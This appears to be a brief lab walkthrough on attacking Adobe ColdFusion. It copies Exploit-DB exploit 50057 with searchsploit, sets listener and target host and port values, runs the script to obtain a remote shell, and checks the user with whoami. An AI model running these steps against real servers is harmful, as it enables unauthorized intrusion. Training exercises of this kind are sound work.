# [Attacking ColdFusion](Attacking%20ColdFusion.md)
### What user is ColdFusion running as?

```shell
earchsploit -p 50057
```

Modify the lhost, lport, rhost and rport to exploit
![](Screenshot%202026-08-02%20at%2021.03.07.png)

Then execute
```shell
python3 50057.py
```
![](Screenshot%202026-08-02%20at%2021.05.35.png)

```cmd
whoami
```
![](Screenshot%202026-08-02%20at%2021.06.01.png)
